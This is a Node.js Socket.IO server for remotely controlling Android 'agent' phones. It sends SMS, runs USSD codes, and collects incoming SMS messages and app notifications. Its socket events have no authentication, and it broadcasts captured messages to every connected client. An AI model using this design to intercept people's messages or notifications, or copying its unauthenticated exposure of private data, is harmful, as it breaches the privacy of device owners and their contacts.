require('dotenv').config();

const express = require('express')
const app = express()

const http = require('http');
const socketIO = require('socket.io');
const helmet = require('helmet');

const compression = require('compression');
const server = http.createServer(app);
const io = socketIO(server, {
    pingInterval: 5000, // Send ping every 5 seconds
    pingTimeout: 5000, // Disconnect if no pong received within 5 seconds
    maxHttpBufferSize: 1e7
});

global.io = io;
global.connectedUsers = {};
global.currentPorcesses = {};

const databaseManager = require("./managers/databaseManager");

const adminRoute = require('./routes/adminRoutes')
const userRoute = require('./routes/userRoutes')
const agentRoute = require('./routes/agentRoutes')
const agentAdminRoute = require('./routes/agentAdminRoutes')

const {MessageModel, NotificationModel, AgentModel} = require("./models/dataModels");
const {getPreferredTime} = require("./managers/timeManager");

app.set('trust proxy', 1);
app.use(helmet());
app.use(express.json())
app.use(express.urlencoded({extended: true}))
app.use(compression({
    level: 6, threshold: 0
}));


app.use('/admin', adminRoute);
app.use('/user', userRoute);
app.use('/agent', agentRoute);
app.use('/agent-admin', agentAdminRoute);

app.use(function (req, res) {
    return res.status(404).send({status: false, message: "Path Not Found"})
});


io.on('connection', (socket) => {
    // console.log('A device connected:', socket.id);

    // Store connected users
    const {number} = socket.handshake.query;
    if (number) {
        connectedUsers[number] = socket.id;
        // console.log('Connected users:', connectedUsers);
    }

    if (number.startsWith("agent")) {
        io.emit('onDeviceStatusChange', number, true);
    }

    socket.on("agent-status", (agentID, ack) => {
        if (connectedUsers[agentID]) {
            ack({status: "success"});
        } else {
            ack({status: "error", "msg": "Agent Offline!"});
        }
    })

    socket.on("send-sms", (agentID, number, message, slot, ack) => {
        if (connectedUsers[agentID]) {
            io.to(connectedUsers[agentID]).timeout(10000).emit("send-sms", number, message, slot, (err, ackData) => {
                if (err) {
                    ack({status: "error", "msg": err.message});
                    return;
                }

                ackData = ackData[0]
                ack(ackData)
            });
        } else {
            ack({status: "error", "msg": "Agent Offline!"});
        }
    })

    socket.on("run-ussd", (agentID, ussd, slot, ack) => {
        if (connectedUsers[agentID]) {
            io.to(connectedUsers[agentID]).timeout(10000).emit("run-ussd", ussd, slot, (err, ackData) => {
                if (err) {
                    ack({status: "error", "msg": err.message});
                    return;
                }

                ackData = ackData[0]
                ack(ackData)
            });
        } else {
            ack({status: "error", "msg": "Agent Offline!"});
        }
    })

    socket.on("all-run-ussd", async (adminID, ussd, slot, ack) => {
        let agents = await AgentModel.find({adminID}).lean();
        console.log(agents)
        for (let i = 0; i < agents.length; i++) {
            if (!connectedUsers[agents[i].agentID]) {
                continue;
            }
            io.to(connectedUsers[agents[i].agentID]).timeout(10000).emit("run-ussd", ussd, slot, (err, ackData) => {
            });
        }
        ack({status: "success", "msg": "Enabled!"});
    })

    socket.on("get_sim_status", (agentID, ack) => {
        if (connectedUsers[agentID]) {
            io.to(connectedUsers[agentID]).timeout(10000).emit("get_sim_status", (err, ackData) => {
                if (err) {
                    ack({status: "error", "msg": err.message});
                    return;
                }

                ackData = ackData[0]
                ack(ackData)
            });
        } else {
            ack({status: "error", "msg": "Agent Offline!"});
        }
    });

    socket.on("get_system_info", async (agentID, ack) => {
        let {apiLevel, deviceName} = await AgentModel.findOne({agentID}).lean();
        if (connectedUsers[agentID]) {
            io.to(connectedUsers[agentID]).timeout(10000).emit("get_system_info", (err, ackData) => {
                if (err) {
                    ack({
                        status: "success", data: {
                            apiLevel, deviceName
                        }
                    });
                    return;
                }
                ackData = ackData[0]
                ack(ackData)
            });
        } else {
            ack({
                status: "success", data: {
                    apiLevel, deviceName
                }
            });
        }
    })

    socket.on("sms", async (agentID, sender, message) => {
        // console.log('Received sms: From', sender, "Msg", agentID, message);
        let msgModel = new MessageModel({agentID, sender, message, time: getPreferredTime()});
        await msgModel.save();
        io.emit("message-" + agentID, sender, getPreferredTime(), message);
    });

    socket.on("notification", async (agentID, appName, title, text) => {
        // console.log('Received notification: Title', title, "Text", text);
        let notificationModel = new NotificationModel({agentID, appName, title, text, time: getPreferredTime()});
        await notificationModel.save();
        io.emit("notification-" + agentID, title, getPreferredTime(), text, appName);
    });

    socket.on('disconnect', () => {
        if (number.startsWith("agent")) {
            io.emit('onDeviceStatusChange', number, false); // number is agentID in case of agentApp
        }
        if (number && connectedUsers[number]) {
            // console.log(`Device disconnected: ${socket.id}`);
            if (connectedUsers[number] === socket.id) {
                delete connectedUsers[number];
            }
            // console.log('Updated connected users:', connectedUsers);
        }
    });

});

const port = process.env.PORT || 3002;
server.listen(port, async () => {
    console.log("------------------------");
    console.log("Server running on Port", port);
    await databaseManager.connect();

});
